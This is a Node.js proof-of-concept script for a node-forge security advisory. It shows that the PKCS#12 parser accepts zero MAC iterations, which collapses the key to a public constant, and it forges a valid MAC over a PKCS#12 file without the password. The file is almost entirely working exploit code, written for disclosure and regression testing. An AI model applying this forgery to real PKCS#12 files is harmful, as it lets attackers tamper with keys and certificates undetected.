#!/usr/bin/env node

// Security Advisory PoC
//
// https://github.com/digitalbazaar/forge/security/advisories/GHSA-jc66-7q78-782g
//
// Thai (Calif.io), in collaboration with Claude and Anthropic Research.
//
// Unit tests based on this PoC were added in the PKCS#12 unit tests.

/**
 * PoC: PKCS#12 MAC Forgery via Zero-Iteration KDF in node-forge
 *
 * Demonstrates that node-forge's PKCS#12 parser accepts iter=0 in MacData,
 * which collapses the PKCS#12 KDF output to a fixed public constant
 * (0x03 repeated n times for MAC keys), allowing an attacker without
 * knowledge of the password to forge a valid MAC over tampered contents.
 *
 * Target: node-forge 1.4.1-0 (commit 7a43db987bd0ecdc5b41f6d73f58ba6ca5bf9ae1)
 * Files:  lib/pkcs12.js:467-468 (no lower-bound clamp on macIterations)
 *         lib/pbe.js:707        (hash loop skipped when iter=0)
 */
'use strict';

const forge = require('../../lib/index');
const asn1 = forge.asn1;

console.log('=== PKCS#12 MAC Forgery via Zero-Iteration KDF (node-forge) ===\n');

// ---------------------------------------------------------------------------
// PART 1: Direct KDF demonstration — iter=0 yields fixed constant key
// ---------------------------------------------------------------------------
console.log('[*] PART 1: generatePkcs12Key with iter=0 yields fixed constant\n');

function kdfHex(pw, saltStr, iter) {
  const salt = new forge.util.ByteBuffer(saltStr);
  const key = forge.pkcs12.generateKey(pw, salt, 3, iter, 20, forge.md.sha1.create());
  return forge.util.bytesToHex(key.getBytes());
}

const k1 = kdfHex('password_one',       'salt_AAA', 0);
const k2 = kdfHex('TOTALLY_DIFFERENT!', 'salt_BBB', 0);
const k3 = kdfHex(null,                 '',         0);
const predicted = '03'.repeat(20);

console.log('  key(pw="password_one",     salt="salt_AAA", iter=0): ' + k1);
console.log('  key(pw="TOTALLY_DIFFERENT",salt="salt_BBB", iter=0): ' + k2);
console.log('  key(pw=null,               salt="",         iter=0): ' + k3);
console.log('  predicted (0x03 * 20):                              ' + predicted);

const part1ok = (k1 === predicted && k2 === predicted && k3 === predicted);
console.log('\n  >>> All keys identical & predictable? ' +
            (part1ok ? 'YES -- KDF IS BROKEN FOR iter=0' : 'NO'));

// ---------------------------------------------------------------------------
// PART 2: Full MAC-forgery round-trip via public API pkcs12FromAsn1
// ---------------------------------------------------------------------------
console.log('\n[*] PART 2: Full MAC-forgery attack via pkcs12FromAsn1\n');

// --- Victim: generate a keypair + self-signed cert, build a legitimate P12 ---
const keys = forge.pki.rsa.generateKeyPair(1024);
const cert = forge.pki.createCertificate();
cert.publicKey = keys.publicKey;
cert.serialNumber = '01';
cert.validity.notBefore = new Date();
cert.validity.notAfter  = new Date(Date.now() + 365 * 24 * 3600 * 1000);
const attrs = [{ name: 'commonName', value: 'victim.example' }];
cert.setSubject(attrs);
cert.setIssuer(attrs);
cert.sign(keys.privateKey, forge.md.sha256.create());

const VICTIM_PW = 'VictimSecretPassword!2024';

const legitP12 = forge.pkcs12.toPkcs12Asn1(
  keys.privateKey, [cert], VICTIM_PW,
  { algorithm: '3des', generateLocalKeyId: true }
);
const legitDer = asn1.toDer(legitP12).getBytes();
console.log('  [Victim]   Created PKCS#12 (' + legitDer.length +
            ' bytes) with password: "' + VICTIM_PW + '"');

// Baseline: legitimate P12 + correct password => MAC OK
forge.pkcs12.pkcs12FromAsn1(asn1.fromDer(legitDer), false, VICTIM_PW);
console.log('  [Victim]   Baseline parse with correct password -> MAC OK\n');

// --- Attacker: intercepts P12, tampers, forges MAC without knowing password ---
console.log('  [Attacker] Intercepts P12. Does NOT know password.');

// Parse the outer PFX structure to get at authSafe + MacData
const pfx = asn1.fromDer(legitDer);
// PFX ::= SEQUENCE { version, authSafe ContentInfo, macData MacData OPTIONAL }
const authSafeCI = pfx.value[1];               // ContentInfo
// ContentInfo.content is [0] EXPLICIT -> OCTET STRING (Data)
const dataOctetString = authSafeCI.value[1].value[0];
const authSafeBytes = dataOctetString.value;   // raw DER of AuthenticatedSafe

// (Attacker could mutate authSafeBytes here — swap certBags, inject keyBags, etc.
//  For this PoC we demonstrate the forgery itself: recomputing a valid MAC
//  over the content WITHOUT the password.)

// Compute HMAC-SHA1 over authSafe with the fixed key 0x03*20
const forgedKey = String.fromCharCode(0x03).repeat(20);
const hmac = forge.hmac.create();
hmac.start('sha1', forgedKey);
hmac.update(authSafeBytes);
const forgedDigest = hmac.getMac().getBytes();
console.log('  [Attacker] Computed HMAC-SHA1 with key=0x03*20 (no password needed)');

// Rebuild MacData with iterations = 0
const macData = asn1.create(asn1.Class.UNIVERSAL, asn1.Type.SEQUENCE, true, [
  // mac DigestInfo
  asn1.create(asn1.Class.UNIVERSAL, asn1.Type.SEQUENCE, true, [
    // digestAlgorithm
    asn1.create(asn1.Class.UNIVERSAL, asn1.Type.SEQUENCE, true, [
      asn1.create(asn1.Class.UNIVERSAL, asn1.Type.OID, false,
        asn1.oidToDer(forge.pki.oids.sha1).getBytes()),
      asn1.create(asn1.Class.UNIVERSAL, asn1.Type.NULL, false, '')
    ]),
    // digest
    asn1.create(asn1.Class.UNIVERSAL, asn1.Type.OCTETSTRING, false, forgedDigest)
  ]),
  // macSalt (arbitrary — ignored when iter=0)
  asn1.create(asn1.Class.UNIVERSAL, asn1.Type.OCTETSTRING, false, 'ATTKSALT'),
  // iterations INTEGER 0  <-- THE HOSTILE VALUE
  asn1.create(asn1.Class.UNIVERSAL, asn1.Type.INTEGER, false,
    String.fromCharCode(0x00))
]);
console.log('  [Attacker] Set macIterations=0 to force predictable KDF output');

// Splice forged MacData into PFX
pfx.value[2] = macData;
const tamperedDer = asn1.toDer(pfx).getBytes();
console.log('  [Attacker] Built tampered P12 with forged MAC (' +
            tamperedDer.length + ' bytes)\n');

// --- Victim: parses tampered P12 with their REAL password ---
console.log('  [Victim]   Parsing tampered P12 with real password "' +
            VICTIM_PW + '"...');
let part2ok = false;
try {
  forge.pkcs12.pkcs12FromAsn1(asn1.fromDer(tamperedDer), false, VICTIM_PW);
  console.log('  [Victim]   MAC verification: PASSED\n');
  console.log('  !!! VULNERABILITY CONFIRMED !!!');
  console.log('  !!! Attacker forged a valid MAC WITHOUT knowing the password.');
  console.log('  !!! PKCS#12 integrity protection is BYPASSED.');
  part2ok = true;
} catch (e) {
  console.log('  [Victim]   MAC verification: FAILED (' + e.message + ')');
  console.log('  (Forgery did not succeed — vulnerability NOT confirmed)');
}

// ---------------------------------------------------------------------------
// PART 3: Sanity — wrong MAC with normal iterations should still fail
// ---------------------------------------------------------------------------
console.log('\n[*] PART 3: Sanity — garbage MAC with iter=2048 is rejected\n');

const sanePfx = asn1.fromDer(legitDer);
const saneMac = asn1.create(asn1.Class.UNIVERSAL, asn1.Type.SEQUENCE, true, [
  asn1.create(asn1.Class.UNIVERSAL, asn1.Type.SEQUENCE, true, [
    asn1.create(asn1.Class.UNIVERSAL, asn1.Type.SEQUENCE, true, [
      asn1.create(asn1.Class.UNIVERSAL, asn1.Type.OID, false,
        asn1.oidToDer(forge.pki.oids.sha1).getBytes()),
      asn1.create(asn1.Class.UNIVERSAL, asn1.Type.NULL, false, '')
    ]),
    asn1.create(asn1.Class.UNIVERSAL, asn1.Type.OCTETSTRING, false,
      'XXXXXXXXXXXXXXXXXXXX')  // garbage digest
  ]),
  asn1.create(asn1.Class.UNIVERSAL, asn1.Type.OCTETSTRING, false, 'SALTSALT'),
  asn1.create(asn1.Class.UNIVERSAL, asn1.Type.INTEGER, false,
    asn1.integerToDer(2048).getBytes())
]);
sanePfx.value[2] = saneMac;
const saneDer = asn1.toDer(sanePfx).getBytes();

let part3ok = false;
try {
  forge.pkcs12.pkcs12FromAsn1(asn1.fromDer(saneDer), false, VICTIM_PW);
  console.log('  Garbage MAC was ACCEPTED — MAC check is not active?!');
} catch (e) {
  console.log('  Garbage MAC correctly rejected: "' + e.message + '"');
  console.log('  (Confirms MAC check is active — bypass in Part 2 is real)');
  part3ok = true;
}

// ---------------------------------------------------------------------------
console.log('\n=== SUMMARY ===');
console.log('KDF flaw (iter=0 -> fixed key): ' + (part1ok ? 'CONFIRMED' : 'FAILED'));
console.log('MAC forgery bypass:             ' + (part2ok ? 'CONFIRMED' : 'FAILED'));
console.log('Sanity (MAC check active):      ' + (part3ok ? 'CONFIRMED' : 'FAILED'));

process.exit((part1ok && part2ok && part3ok) ? 0 : 1);
